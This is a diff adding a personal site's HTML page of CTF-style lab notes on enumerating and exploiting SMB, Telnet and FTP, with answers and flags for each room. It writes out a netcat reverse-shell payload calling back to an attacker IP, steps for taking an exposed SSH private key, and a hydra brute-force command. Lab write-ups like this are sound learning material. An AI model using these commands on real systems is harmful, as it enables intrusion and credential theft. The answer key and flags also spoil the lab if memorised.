@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>My Site</title>
+<meta name="description" content="Hello, I&#39;m [redacted]">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:1313/css/palettes/tokyo-night-dark.css">
+<link rel="stylesheet" href="http://localhost:1313/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:1313/css/custom.css">
+
+
+
+
+
+
+
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="http://localhost:1313/" class="page__logo-inner">My Site</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/about/" title="">About</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/notes" title="">Notes</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:1313/posts" title="">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1></h1>
+    </header>
+    <div class="content__body">
+        <h1 id="smb-server-message-block-protocol">SMB (Server Message Block) Protocol</h1>
+<p>Port: 445, 139, 137, 138</p>
+<h2 id="overview">Overview</h2>
+<ul>
+<li><strong>SMB</strong> is a client-server <em>communication protocol</em> for sharing access to files, printers, serial ports, and other network resources.</li>
+<li><strong>Servers</strong> expose file systems and resources (printers, named pipes, APIs) to clients.</li>
+<li><strong>Clients</strong> connect using:
+<ul>
+<li><strong>TCP/IP</strong> (NetBIOS over TCP/IP, per RFC1001 &amp; RFC1002)</li>
+<li><strong>NetBEUI</strong></li>
+<li><strong>IPX/SPX</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong>![[Pasted image 20250504234250.png]]</strong></p>
+<h4 id="samba">Samba</h4>
+<ul>
+<li>Provides SMB support for Unix systems.</li>
+<li>Compatible since Windows 95.</li>
+</ul>
+<h4 id="solutions">Solutions:</h4>
+<ol>
+<li>What does SMB stand for?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Server Message Block
+</span></span></code></pre></div><ol start="2">
+<li>What type of protocol is SMB?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>response-request`
+</span></span></code></pre></div><ol start="3">
+<li>What protocol suite do clients use?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>TCP/IP
+</span></span></code></pre></div><ol start="4">
+<li>What systems does Samba run on?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Unix
+</span></span></code></pre></div><h2 id="enumerating-smb">Enumerating SMB</h2>
+<p>Gathering information on usernames, passwords, shares, etc.</p>
+<h4 id="tools">Tools</h4>
+<ol>
+<li><strong>Nmap</strong> – Basic SMB port scanning.</li>
+<li><strong>Enum4Linux</strong> – Comprehensive SMB enumeration.</li>
+</ol>
+<h4 id="enum4linux-usage">Enum4Linux Usage</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>enum4linux <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> &lt;IP&gt;
+</span></span></code></pre></div><table>
+  <thead>
+      <tr>
+          <th><strong>Tag</strong></th>
+          <th><strong>Function</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-U</code></td>
+          <td>Get userlist</td>
+      </tr>
+      <tr>
+          <td><code>-M</code></td>
+          <td>Get machine list</td>
+      </tr>
+      <tr>
+          <td><code>-N</code></td>
+          <td>Get namelist dump</td>
+      </tr>
+      <tr>
+          <td><code>-S</code></td>
+          <td>Get sharelist</td>
+      </tr>
+      <tr>
+          <td><code>-P</code></td>
+          <td>Get password policy info</td>
+      </tr>
+      <tr>
+          <td><code>-G</code></td>
+          <td>Get group and member list</td>
+      </tr>
+      <tr>
+          <td><code>-a</code></td>
+          <td>Full basic enumeration</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Data Collected:</strong></p>
+<ul>
+<li>Workgroup name</li>
+<li>OS version</li>
+<li>Usernames &amp; passwords</li>
+<li>Open SMB ports</li>
+<li>Machine name</li>
+<li>Available shares</li>
+</ul>
+<h4 id="solutions-1">Solutions:</h4>
+<ol>
+<li>Conduct an <strong>nmap</strong> scan of your choosing, How many ports are open?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>3
+</span></span></code></pre></div><ol start="2">
+<li>What ports is <strong>SMB</strong> running on? Provide the ports in ascending order.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>139,445
+</span></span></code></pre></div><ol start="3">
+<li>Let&rsquo;s get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the <strong>workgroup</strong> name?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>WORKGROUP
+</span></span></code></pre></div><ol start="4">
+<li>What comes up as the <strong>name</strong> of the machine?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>POLOSMB
+</span></span></code></pre></div><ol start="5">
+<li>What operating system <strong>version</strong> is running?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>6.1
+</span></span></code></pre></div><ol start="6">
+<li>What share sticks out as something we might want to investigate?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>profiles
+</span></span></code></pre></div><h2 id="exploiting-smb">Exploiting SMB</h2>
+<p>Common vulnerabilities include:</p>
+<ul>
+<li><strong>CVE-2017-7494</strong> (Remote Code Execution)</li>
+<li><strong>Anonymous SMB Access</strong> (Misconfiguration leading to info leaks)</li>
+</ul>
+<h4 id="exploitation-method">Exploitation Method:</h4>
+<p>From enumeration, we typically know:</p>
+<ul>
+<li>SMB share location (e.g., <code>workgroup: workgroup</code>)</li>
+<li>Interesting share names (e.g., <code>profiles</code>)</li>
+</ul>
+<h4 id="smbclient">SMBclient</h4>
+<p>Connect to an SMB share:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USERNAME&gt; -p &lt;PORT&gt;
+</span></span></code></pre></div><p><strong>Example:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.10.2/secret -U suit -p <span style="color:#ae81ff">445</span>
+</span></span></code></pre></div><p><strong>Useful Commands Inside SMB Shell:</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th>Command</th>
+          <th>Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>help</code></td>
+          <td>List available commands</td>
+      </tr>
+      <tr>
+          <td><code>ls</code></td>
+          <td>List files</td>
+      </tr>
+      <tr>
+          <td><code>cd &lt;dir&gt;</code></td>
+          <td>Change directory</td>
+      </tr>
+      <tr>
+          <td><code>mget &lt;file&gt;</code></td>
+          <td>Download file</td>
+      </tr>
+      <tr>
+          <td><code>more &lt;file&gt;</code></td>
+          <td>View file contents (like <code>cat</code>)</td>
+      </tr>
+  </tbody>
+</table>
+<p>Here&rsquo;s your requested format:</p>
+<h4 id="solutions-2">Solutions:</h4>
+<ol>
+<li>What would be the correct syntax to access an SMB share called &ldquo;secret&rdquo; as user &ldquo;suit&rdquo; on a machine with the IP 10.10.10.2 on the default port?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>smbclient //10.10.10.2/secret -U suit -p <span style="color:#ae81ff">445</span>
+</span></span></code></pre></div><ol start="2">
+<li>Does the share allow anonymous access? Y/N?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Y
+</span></span></code></pre></div><ol start="3">
+<li>Who can we assume this profile folder belongs to?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>John Cactus
+</span></span></code></pre></div><ol start="4">
+<li>What service has been configured to allow him to work from home?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>ssh
+</span></span></code></pre></div><ol start="5">
+<li>What directory on the share should we look in?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>.ssh
+</span></span></code></pre></div><ol start="6">
+<li>Which of these keys is most useful to us?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>id_rsa
+</span></span></code></pre></div><p>Download command used:</p>
+<pre tabindex="0"><code class="language-smbclient" data-lang="smbclient">mget id_rsa download_id_rsa
+</code></pre><p>SSH into the target server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh cactus@&lt;target_ip&gt; -i download_id_rsa
+</span></span></code></pre></div><ol start="8">
+<li>What is the smb.txt flag?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>THM{smb_is_fin_eh?}
+</span></span></code></pre></div><hr>
+<h1 id="telnet">Telnet</h1>
+<p>Ports: 23</p>
+<ul>
+<li><em>Application protocol</em> (largely replaced by SSH due to lack of encryption)</li>
+<li>Transmits data in <strong>clear text</strong> (no encryption)</li>
+</ul>
+<p><strong>Basic Connection:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>telnet &lt;ip&gt; &lt;port&gt;
+</span></span></code></pre></div><h4 id="solutions-3">Solutions:</h4>
+<ol>
+<li>What is Telnet?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>application protocol
+</span></span></code></pre></div><ol start="2">
+<li>What has slowly replaced Telnet?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>ssh
+</span></span></code></pre></div><ol start="3">
+<li>How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>telnet 10.10.10.3 <span style="color:#ae81ff">23</span>
+</span></span></code></pre></div><ol start="4">
+<li>The lack of what means that all Telnet communication is in plaintext?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>encryption
+</span></span></code></pre></div><h2 id="enumerating-telnet">Enumerating Telnet</h2>
+<h4 id="port-scanning">Port Scanning</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -vv -Pn -p- &lt;target ip&gt;
+</span></span></code></pre></div><p><strong>Key Insight:</strong></p>
+<ul>
+<li>Telnet on <strong>non-standard ports</strong> won’t appear in Nmap’s default top 1000 scan.</li>
+<li>Always scan all ports (<code>-p-</code>) for thorough enumeration.</li>
+<li><code>-A</code> for aggressive scanning and useful NSE scripts tested</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -vv -A -oN scanport &lt;target ip&gt;
+</span></span></code></pre></div><p><strong>Useful Resources:</strong></p>
+<ul>
+<li><a href="https://www.cvedetails.com/">CVE Details</a></li>
+<li><a href="https://cve.mitre.org/">MITRE CVE Database</a></li>
+</ul>
+<h4 id="solutions-4">Solutions:</h4>
+<ol>
+<li>How many <strong>ports</strong> are open on the target machine?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>1
+</span></span></code></pre></div><ol start="2">
+<li>What <strong>port</strong> is this?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>8012
+</span></span></code></pre></div><ol start="3">
+<li>This port is unassigned, but still lists the <strong>protocol</strong> it&rsquo;s using, what protocol is this?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>tcp
+</span></span></code></pre></div><ol start="4">
+<li>Now re-run the <strong>nmap</strong> scan, without the <strong>-p-</strong> tag, how many ports show up as open?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>0
+</span></span></code></pre></div><p>(This is because telnet is running on a non-standard port 8012 which is beyond the 1000 standard ports and hence won&rsquo;t appear in a standard nmap scan which only scans for 1000 ports)</p>
+<ol start="5">
+<li>Based on the title returned to us, what do we think this port could be <strong>used for</strong>?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>a backdoor
+</span></span></code></pre></div><p>(we can find this out by doing an aggressive scan - it returns a string which says &ldquo;SKIDY&rsquo;S BACKDOOR&rdquo;)</p>
+<ol start="6">
+<li>Who could it belong to? Gathering possible <strong>usernames</strong> is an important step in enumeration.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Skidy
+</span></span></code></pre></div><h2 id="exploiting-telnet">Exploiting Telnet</h2>
+<h4 id="basic-access">Basic Access</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>telnet &lt;ip&gt; &lt;port&gt;
+</span></span></code></pre></div><p>Understanding Shells</p>
+<ul>
+<li><strong>Shell</strong>: Code that enables command execution on a target device.</li>
+<li><strong>Reverse Shell</strong>: Target machine initiates a connection back to the attacker’s listening machine.</li>
+</ul>
+<p>Manual Command Execution</p>
+<p>Inside Telnet:</p>
+<pre tabindex="0"><code class="language-telnet" data-lang="telnet">.RUN &lt;command&gt;  # Commands must be prefixed with `.RUN`
+</code></pre><p><strong>Example: Testing Connectivity</strong></p>
+<ol>
+<li><strong>Attacker (Listening):</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo tcpdump ip proto <span style="color:#ae81ff">\\</span>icmp -i tun0  <span style="color:#75715e"># Monitor ICMP traffic</span>
+</span></span></code></pre></div></li>
+<li><strong>Telnet Session:</strong>
+<pre tabindex="0"><code class="language-telnet" data-lang="telnet">.RUN ping [attacker_ip] -c 1  # Send ping to attacker
+</code></pre></li>
+</ol>
+<p><strong>Gaining a Reverse Shell</strong></p>
+<h6 id="step-1-generate-payload-metasploit">Step 1: Generate Payload (Metasploit)</h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p cmd/unix/reverse_netcat lhost<span style="color:#f92672">=[</span>your_ip<span style="color:#f92672">]</span> lport<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> R
+</span></span></code></pre></div><ul>
+<li><strong>Output Example:</strong>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mkfifo /tmp/kcvzv; nc 10.23.108.250 <span style="color:#ae81ff">4444</span> 0&lt;/tmp/kcvzv | /bin/sh &gt;/tmp/kcvzv 2&gt;&amp;1; rm /tmp/kcvzv
+</span></span></code></pre></div></li>
+</ul>
+<h6 id="step-2-start-listener">Step 2: Start Listener</h6>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>  <span style="color:#75715e"># Attacker listens for connection</span>
+</span></span></code></pre></div><h6 id="step-3-execute-payload-via-telnet">Step 3: Execute Payload via Telnet</h6>
+<pre tabindex="0"><code class="language-telnet" data-lang="telnet">.RUN mkfifo /tmp/kcvzv; nc 10.23.108.250 4444 0&lt;/tmp/kcvzv | /bin/sh &gt;/tmp/kcvzv 2&gt;&amp;1; rm /tmp/kcvzv
+</code></pre><p><strong>Successful Connection:</strong><br>
+![[Pasted image 20250513003824.png]]</p>
+<h4 id="solutions-5">Solutions:</h4>
+<ol>
+<li>What welcome message do we receive?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>SKIDY&#39;S BACKDOOR
+</span></span></code></pre></div><ol start="2">
+<li>Do we get a return on any input we enter into the telnet session? (Y/N)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>N
+</span></span></code></pre></div><ol start="3">
+<li>Use the command &ldquo;ping [local THM ip] -c 1&rdquo; through the telnet session (prefaced with .RUN). Do we receive any pings? (Y/N)</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Y
+</span></span></code></pre></div><ol start="4">
+<li>What word does the generated payload start with?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>mkinfo
+</span></span></code></pre></div><ol start="5">
+<li>What would the command look like for the listening port we selected in our payload?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ol start="6">
+<li>What is the contents of flag.txt?</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>THM{y0u_g0t_th3_t3ln3t_fl4g}
+</span></span></code></pre></div><hr>
+<h1 id="ftp">FTP</h1>
+<p>Ports: 21</p>
+<p>command anddata channels
+client server model
+active and passive FTP
+<a href="https://www.ietf.org/rfc/rfc959.txt">https://www.ietf.org/rfc/rfc959.txt</a>.</p>
+<h2 id="enumerating-ftp">Enumerating FTP</h2>
+<p>we tryinf anonymous login, common in CTFs and lazy implementation of ftp shi
+other vuln eg: <a href="https://www.exploit-db.com/exploits/20745">https://www.exploit-db.com/exploits/20745</a></p>
+<p>nmap ports
+agressive scans can reveal a lot uwu</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ftp <span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span> <span style="color:#75715e"># &#34;anonymous&#34;, and no password when prompted.</span>
+</span></span></code></pre></div><h2 id="exploiting-ftp">Exploiting FTP</h2>
+<p><a href="https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP">JSCape</a> demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.
+exploit is weak or default password configurations.</p>
+<p>bruteforce hydra
+install <a href="https://github.com/vanhauser-thc/thc-hydra">here</a>.
+ hydra works for more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.</p>
+<p>eg:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -t <span style="color:#ae81ff">4</span> -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp
+</span></span></code></pre></div><p>hydra                   Runs the hydra tool<br>
+-t 4                    Number of parallel connections per target<br>
+-l [user]               Points to the user who&rsquo;s account you&rsquo;re trying to compromise<br>
+-P [path to dictionary] Points to the file containing the list of possible passwords<br>
+-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt<br>
+[machine IP]            The IP address of the target machine
+ftp / protocol          Sets the protocol</p>
+<p>extra resources</p>
+<ul>
+<li><a href="https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef">https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef</a></li>
+<li><a href="https://attack.mitre.org/techniques/T1210/">https://attack.mitre.org/techniques/T1210/</a></li>
+<li><a href="https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/">https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/</a></li>
+</ul>
+
+    </div>
+    <footer class="content__footer"></footer>
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    
+<h1 class="about__title">:&gt; Ibha</h1>
+<p class="about__description">Hello, I&rsquo;m [redacted]</p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/lumin3t" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="mailto:surgeoffrost@proton.me" rel="me" aria-label="Email" title="Email"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://dev.to/luminet" rel="me" aria-label="Dev.to" title="Dev.to"><i class="ai ai-orcid" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://tryhackme.com/luminet" rel="me" aria-label="TryHackMe" title="TryHackMe"><i class="fa-sharp fa-solid fa-cloud" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+    
+
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      
+          
+            
+            
+                <br/><span class="active">$ echo $LANG<br/><b></b></span><br/>
+
+            
+          
+      
+    
+</p>
+<br /><br />
+<p class="copyright"></p>
+<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
+</footer>
+
+        </div>
+    </body>
+
+</html>
